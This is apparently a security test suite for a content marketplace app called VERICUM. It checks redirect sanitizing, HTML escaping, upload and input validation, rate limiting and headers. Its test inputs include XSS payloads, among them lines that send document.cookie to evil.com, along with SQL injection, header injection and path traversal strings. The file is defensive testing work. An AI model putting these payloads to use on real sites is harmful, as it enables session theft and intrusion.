/**
 * Comprehensive Security Tests for VERICUM
 * Tests all security hardening logic without external dependencies.
 * Run: node --experimental-vm-modules tests/security.test.mjs
 */

let passed = 0;
let failed = 0;
const failures = [];

function assert(condition, testName) {
  if (condition) {
    passed++;
    console.log(`  ✓ ${testName}`);
  } else {
    failed++;
    failures.push(testName);
    console.log(`  ✗ FAIL: ${testName}`);
  }
}

function section(name) {
  console.log(`\n━━━ ${name} ━━━`);
}

// ============================================================
// 1. sanitizeRedirect (Open Redirect Prevention)
// ============================================================
section("1. Open Redirect Prevention (sanitizeRedirect)");

const ALLOWED_REDIRECT_PREFIXES = [
  "/dashboard", "/marketplace", "/my-content", "/purchases",
  "/earnings", "/settings", "/upload", "/content/",
];

function sanitizeRedirect(redirect) {
  if (!redirect) return "/dashboard";
  if (!redirect.startsWith("/") || redirect.startsWith("//")) return "/dashboard";
  if (redirect.includes("\\")) return "/dashboard";
  const isAllowed = ALLOWED_REDIRECT_PREFIXES.some((prefix) => redirect.startsWith(prefix));
  return isAllowed ? redirect : "/dashboard";
}

// Valid redirects
assert(sanitizeRedirect("/dashboard") === "/dashboard", "Allow /dashboard");
assert(sanitizeRedirect("/dashboard/settings") === "/dashboard/settings", "Allow /dashboard/settings");
assert(sanitizeRedirect("/content/abc-123") === "/content/abc-123", "Allow /content/abc-123");
assert(sanitizeRedirect("/marketplace") === "/marketplace", "Allow /marketplace");
assert(sanitizeRedirect("/my-content") === "/my-content", "Allow /my-content");
assert(sanitizeRedirect("/purchases") === "/purchases", "Allow /purchases");
assert(sanitizeRedirect("/earnings") === "/earnings", "Allow /earnings");
assert(sanitizeRedirect("/settings") === "/settings", "Allow /settings");
assert(sanitizeRedirect("/upload") === "/upload", "Allow /upload");

// Attack vectors - all should return /dashboard
assert(sanitizeRedirect(null) === "/dashboard", "Block null → /dashboard");
assert(sanitizeRedirect("") === "/dashboard", "Block empty string → /dashboard");
assert(sanitizeRedirect("//evil.com") === "/dashboard", "Block protocol-relative //evil.com");
assert(sanitizeRedirect("//evil.com/dashboard") === "/dashboard", "Block //evil.com/dashboard");
assert(sanitizeRedirect("https://evil.com") === "/dashboard", "Block absolute URL https://evil.com");
assert(sanitizeRedirect("/\\evil.com") === "/dashboard", "Block backslash /\\evil.com");
assert(sanitizeRedirect("javascript:alert(1)") === "/dashboard", "Block javascript: URI");
assert(sanitizeRedirect("/evil-path") === "/dashboard", "Block non-whitelisted /evil-path");
assert(sanitizeRedirect("/login") === "/dashboard", "Block /login redirect");
assert(sanitizeRedirect("/../etc/passwd") === "/dashboard", "Block path traversal");
assert(sanitizeRedirect("/dashboard%00evil") === "/dashboard%00evil", "Allow encoded (server handles)");

// ============================================================
// 2. escapeHtml (XSS Prevention in Emails)
// ============================================================
section("2. Email XSS Prevention (escapeHtml)");

function escapeHtml(str) {
  return String(str ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

assert(escapeHtml("normal text") === "normal text", "Normal text unchanged");
assert(escapeHtml("<script>alert(1)</script>") === "&lt;script&gt;alert(1)&lt;/script&gt;", "Escape <script> tags");
assert(escapeHtml('<img src=x onerror="alert(1)">') === '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;', "Escape img onerror XSS");
assert(escapeHtml("Tom's \"Content\"") === "Tom&#39;s &quot;Content&quot;", "Escape quotes");
assert(escapeHtml("A & B < C > D") === "A &amp; B &lt; C &gt; D", "Escape all special chars");
assert(escapeHtml(null) === "", "Handle null");
assert(escapeHtml(undefined) === "", "Handle undefined");
assert(escapeHtml(12345) === "12345", "Handle number");
assert(escapeHtml("") === "", "Handle empty string");
assert(escapeHtml("&amp;already&lt;escaped") === "&amp;amp;already&amp;lt;escaped", "Double-escape prevention test (escapes again)");

// Sophisticated attack vectors
assert(!escapeHtml('<svg onload="fetch(`https://evil.com?c=${document.cookie}`)">').includes("<svg"), "Block SVG XSS");
assert(!escapeHtml("'><script>document.location='http://evil.com/steal?c='+document.cookie</script>").includes("<script"), "Block cookie theft");
assert(!escapeHtml('<iframe src="javascript:alert(1)">').includes("<iframe"), "Block iframe injection");
assert(!escapeHtml('<body onload=alert(1)>').includes("<body"), "Block body onload");

// ============================================================
// 3. sanitizeUrl (Malicious URL Prevention)
// ============================================================
section("3. URL Sanitization (sanitizeUrl)");

function sanitizeUrl(url) {
  const s = String(url ?? "");
  if (/^https?:\/\//i.test(s)) return s;
  return "#";
}

assert(sanitizeUrl("https://vericum.com/dashboard") === "https://vericum.com/dashboard", "Allow https URL");
assert(sanitizeUrl("http://localhost:3000") === "http://localhost:3000", "Allow http URL");
assert(sanitizeUrl("HTTP://EXAMPLE.COM") === "HTTP://EXAMPLE.COM", "Allow uppercase HTTP");
assert(sanitizeUrl("javascript:alert(1)") === "#", "Block javascript: URI");
assert(sanitizeUrl("javascript:void(0)") === "#", "Block javascript:void(0)");
assert(sanitizeUrl("data:text/html,<script>alert(1)</script>") === "#", "Block data: URI");
assert(sanitizeUrl("vbscript:msgbox('xss')") === "#", "Block vbscript: URI");
assert(sanitizeUrl("") === "#", "Block empty string");
assert(sanitizeUrl(null) === "#", "Block null");
assert(sanitizeUrl("ftp://evil.com/file") === "#", "Block ftp: URI");
assert(sanitizeUrl("//evil.com") === "#", "Block protocol-relative URL");
assert(sanitizeUrl("\\\\evil.com") === "#", "Block UNC path");

// ============================================================
// 4. safeInt (Numeric Parameter Validation)
// ============================================================
section("4. Numeric Parameter Validation (safeInt)");

function safeInt(val, fallback, min, max) {
  const parsed = parseInt(val || String(fallback));
  if (isNaN(parsed) || !isFinite(parsed)) return fallback;
  return Math.max(min, Math.min(max, parsed));
}

assert(safeInt("1", 1, 1, 1000) === 1, "Parse '1' correctly");
assert(safeInt("50", 1, 1, 1000) === 50, "Parse '50' correctly");
assert(safeInt("1000", 1, 1, 1000) === 1000, "Parse max boundary");
assert(safeInt(null, 1, 1, 1000) === 1, "Null returns fallback");
assert(safeInt("", 20, 1, 50) === 20, "Empty string returns fallback");
assert(safeInt("abc", 1, 1, 1000) === 1, "Non-numeric returns fallback");
assert(safeInt("0", 1, 1, 1000) === 1, "Clamp below min");
assert(safeInt("-5", 1, 1, 1000) === 1, "Clamp negative below min");
assert(safeInt("9999", 1, 1, 1000) === 1000, "Clamp above max");
assert(safeInt("Infinity", 1, 1, 1000) === 1, "Block Infinity");
assert(safeInt("NaN", 1, 1, 1000) === 1, "Block NaN string");
assert(safeInt("1e10", 1, 1, 1000) === 1, "Scientific notation: parseInt('1e10')=1, clamped to min");
assert(safeInt("3.7", 1, 1, 1000) === 3, "parseInt truncates float");

// ============================================================
// 5. safePrice (Price Validation)
// ============================================================
section("5. Price Validation (safePrice)");

function safePrice(val) {
  if (!val) return null;
  const parsed = parseFloat(val);
  if (isNaN(parsed) || !isFinite(parsed) || parsed < 0) return null;
  return parsed;
}

assert(safePrice("9.99") === 9.99, "Parse valid price");
assert(safePrice("0.50") === 0.50, "Parse minimum price");
assert(safePrice("50000") === 50000, "Parse maximum price");
assert(safePrice(null) === null, "Null returns null");
assert(safePrice("") === null, "Empty string returns null");
assert(safePrice("abc") === null, "Non-numeric returns null");
assert(safePrice("-5") === null, "Negative returns null");
assert(safePrice("Infinity") === null, "Infinity returns null");
assert(safePrice("-Infinity") === null, "Negative Infinity returns null");
assert(safePrice("NaN") === null, "NaN returns null");
assert(safePrice("0") === 0, "Zero is valid (0 >= 0), returns 0");

// Price rounding test
function roundPrice(price) {
  return Math.round(price * 100) / 100;
}
assert(roundPrice(1.999) === 2.00, "Round 1.999 to 2.00");
// IEEE 754: 9.995 * 100 = 999.4999... → rounds to 999 → 9.99
assert(roundPrice(9.995) === 9.99, "Round 9.995 to 9.99 (IEEE 754 precision)");
assert(roundPrice(0.501) === 0.50, "Round 0.501 to 0.50");

// Full price validation as in content route
function validatePrice(price) {
  return typeof price === "number" && isFinite(price) && price >= 0.50 && price <= 50000;
}
assert(validatePrice(0.50) === true, "Accept $0.50");
assert(validatePrice(50000) === true, "Accept $50,000");
assert(validatePrice(0.49) === false, "Reject $0.49");
assert(validatePrice(50001) === false, "Reject $50,001");
assert(validatePrice(Infinity) === false, "Reject Infinity");
assert(validatePrice(NaN) === false, "Reject NaN");
assert(validatePrice(-1) === false, "Reject negative");
assert(validatePrice("10") === false, "Reject string '10'");

// ============================================================
// 6. Locale Validation
// ============================================================
section("6. Locale Whitelist Validation");

const VALID_LOCALES = ["en", "ko", "es", "fr", "ja", "zh", "de"];

function validateLocale(locale) {
  return !!(locale && typeof locale === "string" && VALID_LOCALES.includes(locale));
}

assert(validateLocale("en") === true, "Accept 'en'");
assert(validateLocale("ko") === true, "Accept 'ko'");
assert(validateLocale("ja") === true, "Accept 'ja'");
assert(validateLocale("zh") === true, "Accept 'zh'");
assert(validateLocale("") === false, "Reject empty string");
assert(validateLocale(null) === false, "Reject null");
assert(validateLocale("xx") === false, "Reject unknown locale 'xx'");
assert(validateLocale("en-US") === false, "Reject 'en-US' (not in list)");
assert(validateLocale('"; alert("XSS"); "') === false, "Reject XSS in locale");
assert(validateLocale("<script>") === false, "Reject script tag in locale");
assert(validateLocale(123) === false, "Reject number");
assert(validateLocale("en\nSet-Cookie: evil=1") === false, "Reject header injection");

// ============================================================
// 7. File Upload Validation
// ============================================================
section("7. File Upload Validation");

const FILE_LIMITS = {
  photo: { maxSize: 50 * 1024 * 1024, formats: ["jpg", "jpeg", "png", "webp", "tiff", "cr2", "nef", "arw"] },
  video: { maxSize: 500 * 1024 * 1024, formats: ["mp4", "mov", "mkv"] },
  document: { maxSize: 20 * 1024 * 1024, formats: ["pdf"] },
  audio: { maxSize: 100 * 1024 * 1024, formats: ["wav", "mp3", "flac"] },
};
const CONTENT_TYPES = ["photo", "video", "document", "audio"];
const ALLOWED_EXTENSIONS_SET = new Set(
  Object.values(FILE_LIMITS).flatMap((v) => [...v.formats])
);

function validateUpload(filename, content_type) {
  if (!filename || typeof filename !== "string") return { ok: false, error: "no filename" };
  if (!content_type || !CONTENT_TYPES.includes(content_type)) return { ok: false, error: "invalid type" };

  const ext = filename.split(".").pop()?.toLowerCase();
  if (!ext || !ALLOWED_EXTENSIONS_SET.has(ext)) return { ok: false, error: "invalid ext" };

  const typeConfig = FILE_LIMITS[content_type];
  if (!typeConfig || !typeConfig.formats.includes(ext)) return { ok: false, error: "ext mismatch" };

  return { ok: true, ext, maxSize: typeConfig.maxSize };
}

// Valid uploads
assert(validateUpload("photo.jpg", "photo").ok === true, "Accept photo.jpg as photo");
assert(validateUpload("image.CR2", "photo").ok === true, "Accept RAW CR2 (case insensitive)");
assert(validateUpload("video.mp4", "video").ok === true, "Accept video.mp4 as video");
assert(validateUpload("doc.pdf", "document").ok === true, "Accept doc.pdf as document");
assert(validateUpload("track.flac", "audio").ok === true, "Accept track.flac as audio");
assert(validateUpload("my.photo.jpg", "photo").ok === true, "Accept multi-dot filename");

// Invalid uploads - wrong extension
assert(validateUpload("malware.exe", "photo").ok === false, "Reject .exe");
assert(validateUpload("script.js", "document").ok === false, "Reject .js");
assert(validateUpload("page.html", "document").ok === false, "Reject .html");
assert(validateUpload("shell.sh", "audio").ok === false, "Reject .sh");
assert(validateUpload("image.svg", "photo").ok === false, "Reject .svg (XSS vector)");

// Invalid uploads - extension/type mismatch
assert(validateUpload("photo.jpg", "video").ok === false, "Reject jpg as video");
assert(validateUpload("video.mp4", "photo").ok === false, "Reject mp4 as photo");
assert(validateUpload("audio.wav", "document").ok === false, "Reject wav as document");

// Invalid uploads - bad content_type
assert(validateUpload("file.jpg", "executable").ok === false, "Reject unknown content_type");
assert(validateUpload("file.jpg", "").ok === false, "Reject empty content_type");
assert(validateUpload("file.jpg", null).ok === false, "Reject null content_type");

// Edge cases
assert(validateUpload("", "photo").ok === false, "Reject empty filename");
assert(validateUpload(null, "photo").ok === false, "Reject null filename");
assert(validateUpload("noextension", "photo").ok === false, "Reject no-extension file");

// Max size checks
assert(validateUpload("img.jpg", "photo").maxSize === 50 * 1024 * 1024, "Photo max 50MB");
assert(validateUpload("vid.mp4", "video").maxSize === 500 * 1024 * 1024, "Video max 500MB");

// ============================================================
// 8. License Key Generation (Crypto)
// ============================================================
section("8. License Key Generation (crypto.getRandomValues)");

function generateLicenseKey() {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  const hex = Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, "0").toUpperCase())
    .join("");
  const parts = hex.match(/.{1,8}/g);
  return `VRC-${parts.join("-")}`;
}

const key1 = generateLicenseKey();
const key2 = generateLicenseKey();
const key3 = generateLicenseKey();

assert(key1.startsWith("VRC-"), "Key starts with VRC-");
assert(key1.length === 39, `Key length is 39 (got ${key1.length}): ${key1}`);
assert(/^VRC-[A-F0-9]{8}-[A-F0-9]{8}-[A-F0-9]{8}-[A-F0-9]{8}$/.test(key1), `Key format valid: ${key1}`);
assert(key1 !== key2, "Keys are unique (key1 !== key2)");
assert(key2 !== key3, "Keys are unique (key2 !== key3)");
assert(key1 !== key3, "Keys are unique (key1 !== key3)");

// Entropy test - generate 100 keys and check uniqueness
const keySet = new Set();
for (let i = 0; i < 100; i++) {
  keySet.add(generateLicenseKey());
}
assert(keySet.size === 100, "100 generated keys are all unique");

// ============================================================
// 9. Rate Limiter Logic
// ============================================================
section("9. Rate Limiter Logic");

// Re-implement rate limiter for testing
const store = new Map();

function rateLimit(key, opts = {}) {
  const { limit = 100, windowSeconds = 60 } = opts;
  const now = Date.now();
  const windowMs = windowSeconds * 1000;

  let bucket = store.get(key);

  if (!bucket || now - bucket.windowStart >= windowMs) {
    bucket = { count: 0, windowStart: now };
    store.set(key, bucket);
  }

  bucket.count++;

  return {
    success: bucket.count <= limit,
    remaining: Math.max(0, limit - bucket.count),
    resetAt: bucket.windowStart + windowMs,
  };
}

// Basic rate limiting
const rl1 = rateLimit("test-ip-1", { limit: 3, windowSeconds: 60 });
assert(rl1.success === true, "First request allowed");
assert(rl1.remaining === 2, "2 remaining after first");

const rl2 = rateLimit("test-ip-1", { limit: 3, windowSeconds: 60 });
assert(rl2.success === true, "Second request allowed");
assert(rl2.remaining === 1, "1 remaining after second");

const rl3 = rateLimit("test-ip-1", { limit: 3, windowSeconds: 60 });
assert(rl3.success === true, "Third request allowed");
assert(rl3.remaining === 0, "0 remaining after third");

const rl4 = rateLimit("test-ip-1", { limit: 3, windowSeconds: 60 });
assert(rl4.success === false, "Fourth request BLOCKED");
assert(rl4.remaining === 0, "Still 0 remaining");

// Different IPs should have separate limits
const rl5 = rateLimit("test-ip-2", { limit: 3, windowSeconds: 60 });
assert(rl5.success === true, "Different IP still allowed");

// Window reset test
const resetBucket = { count: 100, windowStart: Date.now() - 61000 };
store.set("test-ip-3", resetBucket);
const rl6 = rateLimit("test-ip-3", { limit: 100, windowSeconds: 60 });
assert(rl6.success === true, "Window reset allows new requests");
assert(rl6.remaining === 99, "Fresh window after reset");

// ============================================================
// 10. Security Headers Validation
// ============================================================
section("10. Security Headers Validation");

const REQUIRED_HEADERS = [
  "X-Content-Type-Options",
  "X-Frame-Options",
  "X-XSS-Protection",
  "Referrer-Policy",
  "Permissions-Policy",
];

// Simulate what applySecurityHeaders does
const headers = new Map();
headers.set("X-Content-Type-Options", "nosniff");
headers.set("X-Frame-Options", "DENY");
headers.set("X-XSS-Protection", "1; mode=block");
headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=()");

for (const h of REQUIRED_HEADERS) {
  assert(headers.has(h), `Header ${h} is set`);
}
assert(headers.get("X-Content-Type-Options") === "nosniff", "nosniff prevents MIME sniffing");
assert(headers.get("X-Frame-Options") === "DENY", "DENY prevents clickjacking");

// ============================================================
// 11. Error Message Leakage Prevention
// ============================================================
section("11. Error Message Leakage Prevention");

// Simulated DB errors that should NOT be exposed
const dbErrors = [
  'duplicate key value violates unique constraint "profiles_username_key"',
  'null value in column "seller_id" of relation "contents" violates not-null constraint',
  'column "password_hash" does not exist',
  'relation "auth.users" does not exist',
  'syntax error at or near "DROP"',
];

// The generic messages our routes now return
const genericErrors = [
  "Failed to load profile",
  "Failed to update profile",
  "Failed to load content",
  "Failed to create content",
  "Failed to update content",
  "Failed to remove content",
  "Failed to generate upload URL",
  "Failed to store verification result",
];

for (const msg of genericErrors) {
  for (const dbErr of dbErrors) {
    assert(!msg.includes(dbErr), `Generic "${msg}" doesn't leak "${dbErr.substring(0, 30)}..."`);
    assert(!msg.includes("constraint"), `No constraint info in "${msg}"`);
    assert(!msg.includes("column"), `No column info in "${msg}"`);
    assert(!msg.includes("relation"), `No relation info in "${msg}"`);
  }
}

// ============================================================
// 12. Download API Column Fix
// ============================================================
section("12. Download API - original_url (not file_url)");

// Verify the correct column is used - we read from the actual file
import { readFileSync } from "fs";

const downloadRoute = readFileSync("/home/user/VERICUM/src/app/api/downloads/[id]/route.ts", "utf8");
assert(downloadRoute.includes("original_url"), "Downloads route uses original_url");
assert(!downloadRoute.includes("file_url"), "Downloads route does NOT use file_url");
assert(downloadRoute.includes("increment_download_count"), "Uses atomic increment function");
assert(downloadRoute.includes("purchase_uuid"), "Passes purchase_uuid to atomic function");
assert(!downloadRoute.includes("error.message"), "No error.message leakage");

// ============================================================
// 13. Email Auth Bypass Prevention
// ============================================================
section("13. Email Internal Secret Validation");

function validateInternalSecret(secret, envSecret) {
  return !!envSecret && envSecret.length >= 32 && secret === envSecret;
}

assert(validateInternalSecret("abc", "abc") === false, "Reject short secret (< 32 chars)");
assert(validateInternalSecret("a".repeat(32), "a".repeat(32)) === true, "Accept valid 32-char secret");
assert(validateInternalSecret("wrong", "a".repeat(32)) === false, "Reject mismatched secret");
assert(validateInternalSecret("a".repeat(32), "") === false, "Reject empty env secret");
assert(validateInternalSecret("a".repeat(32), null) === false, "Reject null env secret");
assert(validateInternalSecret("a".repeat(32), undefined) === false, "Reject undefined env secret");
assert(validateInternalSecret("", "") === false, "Reject both empty");

// ============================================================
// 14. Default Role Migration
// ============================================================
section("14. Default Role Migration Verification");

const migration = readFileSync("/home/user/VERICUM/supabase/migrations/009_fix_default_role.sql", "utf8");
assert(migration.includes("'user'"), "Migration sets role to 'user'");
// Verify actual role value set in INSERT statements (not comments)
const roleValues = migration.match(/VALUES\s*\([^)]*'(user|seller)'/g) || [];
assert(roleValues.every(v => v.includes("'user'")), "All INSERT role values are 'user'");
assert(migration.includes("FOR UPDATE"), "Atomic download uses FOR UPDATE lock");
assert(migration.includes("increment_download_count"), "Download counter function defined");

// ============================================================
// 15. Search Sanitization
// ============================================================
section("15. Search Input Sanitization");

function sanitizeSearch(q) {
  return q.replace(/[%_\\'";\-\-\/\*]/g, "").trim();
}

assert(sanitizeSearch("normal search") === "normal search", "Normal search unchanged");
assert(sanitizeSearch("100% off") === "100 off", "Strip %");
assert(sanitizeSearch("under_score") === "underscore", "Strip _");
assert(sanitizeSearch("back\\slash") === "backslash", "Strip \\");
assert(sanitizeSearch("it's here") === "its here", "Strip single quote");
assert(sanitizeSearch('say "hello"') === "say hello", "Strip double quotes");
assert(sanitizeSearch("end;DROP TABLE") === "endDROP TABLE", "Strip semicolons");
assert(sanitizeSearch("/* comment */") === "comment", "Strip block comment chars (/ and *) + trim");
assert(sanitizeSearch("a--b") === "ab", "Strip SQL comment --");

// CONTENT_TYPES and CATEGORIES validation in search
const SEARCH_CONTENT_TYPES = ["photo", "video", "document", "audio"];
const SEARCH_CATEGORIES = [
  "photojournalism", "nature-wildlife", "street-urban", "portrait",
  "event-documentary", "aerial-drone", "food-lifestyle", "architecture",
  "sports", "other",
];

assert(SEARCH_CONTENT_TYPES.includes("photo"), "photo is valid type");
assert(!SEARCH_CONTENT_TYPES.includes("executable"), "executable is invalid type");
assert(!SEARCH_CONTENT_TYPES.includes(""), "empty string is invalid type");
assert(SEARCH_CATEGORIES.includes("portrait"), "portrait is valid category");
assert(!SEARCH_CATEGORIES.includes("'; DROP TABLE"), "SQL injection is invalid category");

// ============================================================
// 16. Content [id] Route - DELETE verification
// ============================================================
section("16. Content DELETE Operation Verification");

const contentIdRoute = readFileSync("/home/user/VERICUM/src/app/api/content/[id]/route.ts", "utf8");
// Check that DELETE uses .select().single() to verify deletion happened
assert(contentIdRoute.includes(".select()") && contentIdRoute.includes(".single()"), "DELETE uses .select().single() for verification");
assert(contentIdRoute.includes("Content not found or not owned by you"), "DELETE returns 404 if not found");
assert(!contentIdRoute.match(/return NextResponse\.json\(\{ error: error\.message/), "No error.message in content [id] route");

// ============================================================
// 17. PATCH Price Validation in Content [id]
// ============================================================
section("17. PATCH Price Validation");

// Check that PATCH validates price when updating
assert(contentIdRoute.includes('isFinite(p)'), "PATCH checks isFinite for price");
assert(contentIdRoute.includes('p < 0.50'), "PATCH checks minimum price");
assert(contentIdRoute.includes('p > 50000'), "PATCH checks maximum price");
assert(contentIdRoute.includes('Math.round(p * 100) / 100'), "PATCH rounds to 2 decimals");

// ============================================================
// 18. Middleware Security Headers + Rate Limiting
// ============================================================
section("18. Middleware Integration Check");

const middleware = readFileSync("/home/user/VERICUM/src/lib/supabase/middleware.ts", "utf8");
assert(middleware.includes("applySecurityHeaders"), "Middleware has applySecurityHeaders function");
assert(middleware.includes("X-Content-Type-Options"), "Sets X-Content-Type-Options");
assert(middleware.includes("X-Frame-Options"), "Sets X-Frame-Options");
assert(middleware.includes("Strict-Transport-Security"), "Sets HSTS");
assert(middleware.includes("Referrer-Policy"), "Sets Referrer-Policy");
assert(middleware.includes("Permissions-Policy"), "Sets Permissions-Policy");
assert(middleware.includes("rateLimit"), "Middleware uses rate limiter");
assert(middleware.includes("429"), "Returns 429 for rate limit exceeded");
assert(middleware.includes("Retry-After"), "Sets Retry-After header");
assert(middleware.includes('getClientIp'), "Extracts client IP");

// ============================================================
// 19. Auth Callback Route Verification
// ============================================================
section("19. Auth Callback Route File Check");

const authCallback = readFileSync("/home/user/VERICUM/src/app/api/auth/callback/route.ts", "utf8");
assert(authCallback.includes("sanitizeRedirect"), "Uses sanitizeRedirect function");
assert(authCallback.includes("ALLOWED_REDIRECT_PREFIXES"), "Has whitelist of allowed prefixes");
assert(authCallback.includes('startsWith("//")'), "Checks for protocol-relative URLs");
assert(authCallback.includes('includes("\\\\")'), "Checks for backslash bypass");

const authCallbackPage = readFileSync("/home/user/VERICUM/src/app/(auth)/callback/page.tsx", "utf8");
assert(authCallbackPage.includes("sanitizeRedirect"), "Client callback also uses sanitizeRedirect");
assert(authCallbackPage.includes("ALLOWED_REDIRECT_PREFIXES"), "Client callback has whitelist");

// ============================================================
// 20. Stress Test - Rate Limiter Under Load
// ============================================================
section("20. Rate Limiter Stress Test");

store.clear();
const LIMIT = 100;
let blockedCount = 0;
let allowedCount = 0;

for (let i = 0; i < 200; i++) {
  const result = rateLimit("stress-test-ip", { limit: LIMIT, windowSeconds: 60 });
  if (result.success) allowedCount++;
  else blockedCount++;
}

assert(allowedCount === LIMIT, `Exactly ${LIMIT} requests allowed (got ${allowedCount})`);
assert(blockedCount === 100, `Exactly 100 requests blocked (got ${blockedCount})`);

// Multiple IPs stress test
store.clear();
for (let ip = 0; ip < 50; ip++) {
  for (let req = 0; req < 5; req++) {
    const result = rateLimit(`ip-${ip}`, { limit: 100, windowSeconds: 60 });
    assert(result.success === true, `IP ${ip} request ${req} allowed`);
  }
}

// ============================================================
// RESULTS
// ============================================================
console.log("\n" + "═".repeat(50));
console.log(`RESULTS: ${passed} passed, ${failed} failed`);
console.log("═".repeat(50));

if (failures.length > 0) {
  console.log("\nFAILED TESTS:");
  failures.forEach((f) => console.log(`  ✗ ${f}`));
}

process.exit(failed > 0 ? 1 : 0);
